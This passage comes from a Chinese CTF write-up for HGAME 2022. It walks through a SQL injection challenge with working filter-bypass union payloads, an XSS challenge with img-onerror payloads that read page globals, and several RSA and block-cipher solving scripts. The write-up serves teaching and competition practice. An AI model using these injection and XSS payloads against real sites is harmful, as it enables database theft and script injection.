alt="image-20220130223228959"></p><p>开始页面，源码里提示了个index?id=1</p><p>输到url上能看出来id的数决定了出现的是哪个精灵</p><p>当id不是1，2，3其中的数时会跳转到error.php</p><p>刚开始感觉是sql注入，注了半天这个页面没报错，这里id的值感觉是通过php的弱比较来判断的，开始怀疑是不是别的漏洞。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130223531260.png" alt="image-20220130223531260"></p><p>扫了一下扫到了db.php才确定就是sql注入</p><p>于是尝试在error界面注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130223651689.png" alt="image-20220130223651689"></p><p>当code不为数字时会出现报错</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130223713519.png" alt="image-20220130223713519"></p><p>刚开始没有给源码，试了好几次没试出来怎么注入</p><p>主办方给的源码：</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130223751805.png" alt="image-20220130223751805"></p><p>有了源码之后就是一个很简单的联合注入了</p><p>括号或者/*x*/替代空格，用like替代等于，双写绕过关键字，因为是数字型注入，所以也不需要注释符</p><p>爆库名</p><pre class="language-none"><code class="language-none">?code&#x3D;1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,database()</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130221501997.png" alt="image-20220130221501997"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(table_name)frfromom(infoorrmation_schema.tables)whwhereere(table_schema)like&#39;pokemon&#39;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130221833846.png" alt="image-20220130221833846"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name)like&#39;fllllllllaaaaaag&#39;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130221937816.png" alt="image-20220130221937816"></p><pre class="language-none"><code class="language-none">?code&#x3D;-1&#x2F;*x*&#x2F;ununionion&#x2F;*x*&#x2F;selselectect&#x2F;*x*&#x2F;1,(flag)frfromom&#x2F;*x*&#x2F;fllllllllaaaaaa</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220130222120527.png" alt="image-20220130222120527"></p><h3 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板*"></a>At0m的留言板*</h3><p>xss漏洞</p><p>说起这个我就想起来b站那次的xss，还有我还没开始的js学习（</p><p>先试一下</p><pre class="language-none"><code class="language-none">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220205121248714.png" alt="image-20220205121248714"></p><p>确定是xss</p><p>然后主办方给了个hint</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220211120719244.png" alt="image-20220211120719244"></p><p>输出用户留言位置的class标签名为content，然后还有一个用var定义的flag全局变量</p><p>为什么同样是两个变量，第一个使用let，而第二个使用var呢？因为使用 var 可 以利用 Object.keys(window) 拿到全局变量 flag 的变量名，而使用let的话无法获取。</p><p>这是官方wp的解释，复现之后发现可以直接用Object.values(window)读取这些全局变量的内容，也就是直接获得flag</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"document.getElementsByClassName('content')[0].innerHTML= Object.values(window)"</span><span class="token operator">></span></code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220211121033670.png" alt="image-20220211121033670"></p><p>由于提示里这个flag定义在了一个script标签里，我们也可以用document.scripts来读出script标签里的内容</p><pre class="language-none"><code class="language-none">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;) [0].innerText&#x3D;document.scripts[0].text;&quot;&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220211124302100.png" alt="image-20220211124302100"></p><h2 id="CRYPTO-1"><a href="#CRYPTO-1" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA-Attack"><a href="#RSA-Attack" class="headerlink" title="RSA Attack"></a>RSA Attack</h3><p>rsa真是全套脚本就行</p><p>加密脚本</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagm &#x3D; s2n(flag)e &#x3D; 65537p &#x3D; getPrime(80)q &#x3D; getPrime(80)n &#x3D; p * qc &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)</code></pre><p>正常的rsa加密，给了e，n，c求m</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129190127418.png" alt="image-20220129190127418"></p><p>在线网站分解n得到pq</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129190208787.png" alt="image-20220129190208787"></p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2sdef Decrypt(c, e, p, q):   L &#x3D; (p - 1) * (q - 1)   d &#x3D; gmpy2.invert(e, L)   n &#x3D; p * q   m &#x3D; gmpy2.powmod(c, d, n)   flag &#x3D; n2s(int(m)   print(flag)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   p &#x3D;  715800347513314032483037   q &#x3D;  978782023871716954857211   e &#x3D; 65537   c &#x3D; 122622425510870177715177368049049966519567512708   Decrypt(c, e, p, q)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129190508606.png" alt="image-20220129190508606"></p><h3 id="RSA-Attack-2"><a href="#RSA-Attack-2" class="headerlink" title="RSA Attack 2"></a>RSA Attack 2</h3><p>加密脚本</p><pre class="language-none"><code class="language-none">import refrom math import ceilfrom Crypto.Util.number import getPrimefrom libnum import s2n#flag_parts &#x3D; list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) &#x2F; 3)&#125;&#125;&#125;&quot;, flag)))print(&quot;# task1&quot;)m &#x3D; 42949244670170607238949839659191560916635942982341043413490558510e &#x3D; 65537p &#x3D; 118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123q &#x3D; 123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411r &#x3D; 169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833n1 &#x3D; p * qc1 &#x3D; pow(m, e, n1)n2 &#x3D; r * qc2 &#x3D; pow(m, e, n2)print(&quot;e &#x3D;&quot;, e)print(&quot;n1 &#x3D;&quot;, n1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;n2 &#x3D;&quot;, n2)print(&quot;c2 &#x3D;&quot;, c2)print(&quot;# task2&quot;)m &#x3D; 26926584401348540331333678102939069838976561137078484378892509505e &#x3D; 7p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; pow(m, e, n)print(&quot;e &#x3D;&quot;, e)print(&quot;n &#x3D;&quot;, n)print(&quot;c &#x3D;&quot;, c)print(&quot;# task3&quot;)m &#x3D; flag_parts[2]p &#x3D; getPrime(1024)q &#x3D; getPrime(1024)n &#x3D; p * qe1 &#x3D; getPrime(32)e2 &#x3D; getPrime(32)c1 &#x3D; pow(m, e1, n)c2 &#x3D; pow(m, e2, n)print(&quot;n &#x3D;&quot;, n)print(&quot;e1 &#x3D;&quot;, e1)print(&quot;c1 &#x3D;&quot;, c1)print(&quot;e2 &#x3D;&quot;, e2)print(&quot;c2 &#x3D;&quot;, c2)</code></pre><p>将flag分了三段后分别用了不同的加密方式</p><p><strong>第一段</strong></p><p>代码能看出n1和n2有共同的素因子，那么可以利用欧几里得算法直接将 n1 和 n2 分解。通过欧几里得算法可以直接求出 n1 和 n2 的最大公约数 p:</p><p>output给了e,n1,n2,c1,c2</p><pre class="language-none"><code class="language-none">def gcd(a, b):    if a &lt; b:        a, b &#x3D; b, a    while b !&#x3D; 0:        temp &#x3D; a % b        a &#x3D; b        b &#x3D; temp    return adef gcd_digui(a, b):    if b !&#x3D; 0:        return a    return gcd(b, a % b)n1 &#x3D; 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553n2 &#x3D; 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363p &#x3D; gcd(n1, n2)q &#x3D; n1&#x2F;&#x2F;pr &#x3D; n2&#x2F;&#x2F;pprint(p)print(q)print(r)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129191322862.png" alt="image-20220129191322862"></p><pre class="language-none"><code class="language-none">p&#x3D;123715343521970684000128799876071042830570723218116931151467220244765055889417626806554868114525566978436323975083498703832794561493291312079691396671274837322036085911028636844643698862533724625315331567014898932701977758733187411738771617885153639118174062773966499612201555575923412045644028857989016603411q&#x3D;118106171709518613190337380120721639096109433871758551481750559628607841525199933396401045857313841962667087681000077908575349856203197989280137518119610447265022793158335778819939567162786340083036604758380394175830091289942677310940962706354018362632488404102976344446903748276214668285468119214940392725123r&#x3D;169239143092963922213343686924677363088963485633027091645501151388482565490233323796889691624272664985173525812002355530484741432847170511348177065704338978754457533424010842217007432554862861949141613925946472939183705336155629494107050470952474816647080432002189309272835581148740211208678012416960136441833</code></pre><p>这就相当于有了enc，带到前一个题的代码里得到</p><p>hgame{RsA@hAS!a&amp;VArIETY?of.</p><p><strong>第二段</strong></p><p>e=7像低加密指数分解攻击，直接开七次方</p><pre class="language-none"><code class="language-none">import gmpy2from libnum import n2se &#x3D; 7# 读入 n, 密文n &#x3D; 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c &#x3D; 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625print(&#39;n&#x3D;&#39;, n)print(&#39;c&#x3D;&#39;, c)result &#x3D; gmpy2.iroot(c, 7)print(&#39;  [-]The c has cubic root?&#39;, result[1])if result[1]:    print(&#39;  [-]The m is:&#39;, &#39;&#123;:x&#125;&#39;.format(result[0]))</code></pre><p>得到m = 0x41747461634b5e6d4554686f64535e776841543a6f746865722141</p><p>转字符串的为AttacK^mEThodS^whAT:other!A</p><p><strong>第三段</strong></p><p>共模攻击</p><pre class="language-none"><code class="language-none">from gmpy2 import *from libnum import n2sn &#x3D; 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729e1 &#x3D; 2519901323e2 &#x3D; 3676335737s &#x3D; gcdext(e1, e2)s1 &#x3D; s[1]s2 &#x3D; -s[2]c1 &#x3D; 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870c2 &#x3D; 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861e2 &#x3D; 3676335737c2 &#x3D; invert(c2, n)m &#x3D; (pow(c1, s1, n) * pow(c2, s2, n)) % nprint(m)print(n2s(int(m)))</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220129192505430.png" alt="image-20220129192505430"></p><p>最终flag</p><pre class="language-none"><code class="language-none">hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;</code></pre><h1 id="第三周wp"><a href="#第三周wp" class="headerlink" title="第三周wp"></a>第三周wp</h1><h2 id="CRYPTO-2"><a href="#CRYPTO-2" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>这周密码比上周要简单</p><h3 id="Multi-Prime-RSA"><a href="#Multi-Prime-RSA" class="headerlink" title="Multi Prime RSA"></a>Multi Prime RSA</h3><p>加密脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204171309886.png" alt="image-20220204171309886"></p><p>给了这除了flag其他的变量都给了</p><pre class="language-none"><code class="language-none">p &#x3D; 61789932148719477384027458333380568978056286136137829092952317307711908353477q &#x3D; 91207969353355763685633284378833506319794714507027332929290701748727534193861r &#x3D; 105471299607375388622347272479207944509670502835651250945203397530010861809367s &#x3D; 83153238748903772448138307505579799277162652151244477391465130504267171881437n &#x3D; 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919e &#x3D; 65537c &#x3D; 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</code></pre><p>直接找个rsa的解密脚本带进去就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204123448819.png" alt="image-20220204123448819"></p><h3 id="RSA-Attack-3"><a href="#RSA-Attack-3" class="headerlink" title="RSA Attack 3"></a>RSA Attack 3</h3><p>加密脚本</p><pre class="language-none"><code class="language-none">from Crypto.Util.number import getPrimefrom gmpy2 import invertfrom libnum import s2nfrom secret import flagp &#x3D; getPrime(2048)q &#x3D; getPrime(2048)n &#x3D; p * qd &#x3D; getPrime(64)e &#x3D; invert(d, (p - 1) * (q - 1))c &#x3D; pow(s2n(flag), e, n)print(f&quot;n &#x3D; &#123;n&#125;&quot;)print(f&quot;e &#x3D; &#123;e&#125;&quot;)print(f&quot;c &#x3D; &#123;c&#125;&quot;)</code></pre><p>只给了nec，想要得到明文还要有d，要求d就要指定pq。</p><p>利用rsactftool求公钥私钥文件然后得到pq</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204172702618.png" alt="image-20220204172702618"></p><p>得到公钥</p><pre class="language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7w&#x3D;&#x3D;-----END PUBLIC KEY-----</code></pre><p>再用公钥求私钥</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204172751433.png" alt="image-20220204172751433"></p><p>得到私钥</p><pre class="language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPvZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZnzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5FOGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYkm6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUqdRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipUnLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795CS9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUSBpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSoTyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grnxTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8NpddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICGwQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCotra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enIFkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmkaUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoNduZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6FlIDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1XDzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiDfG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8CCQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hVCAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3LBeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3vgPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92flUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28-----END RSA PRIVATE KEY-----</code></pre><p>再利用私钥求pq</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204172904395.png" alt="image-20220204172904395"></p><p>得到pq之后找个rsa脚本带进去就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204172948397.png" alt="image-20220204172948397"></p><h3 id="Block-Cipher"><a href="#Block-Cipher" class="headerlink" title="Block Cipher"></a>Block Cipher</h3><p>加密脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204173328550.png" alt="image-20220204173328550"></p><p>给了三个值</p><p>iv = b&#39;Up\x14\x98r\x14%\xb9&#39;</p><p>key = b&#39;\r\xe8\xb86\x9c33^&#39;</p><p>parts = [b&#39;0\xff\xcd\xc3\x8b\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]</p><p>加密的逻辑大致是将flag每八个字符一组，不够的在末尾加上chr(len(该段长度))重复一定次数凑够八个字符,同时构造有八组数据的iv和key变量，并与flag分成的组进行一次异或操作，将异或操作后的内容作为下一次异或操作的iv。同时将异或后的内容放入results列表中</p><p>其中返回值的内容都是可迭代类型，所以要利用for循环才能读出里面的内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204175512017.png" alt="image-20220204175512017"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204173726545.png" alt="image-20220204173726545"></p><p>八个一组的数字</p><p>也就相当于第一组48 = 85^13^ord(flag的第一个字符)即ord(&#39;h&#39;)</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204175945549.png" alt="image-20220204175945549"></p><p>经过测试这个也能逆推</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204180050478.png" alt="image-20220204180050478"></p><p>所以只要根据加密脚本将flag变为给的parts里的内容就能分段解密</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204180213786.png" alt="image-20220204180213786"></p><h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>看一下这个路径</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190318143.png" alt="image-20220204190318143"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190356431.png" alt="image-20220204190356431"></p><p>再结合</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/HGAME2022-wp/image-20220204190428652.png" 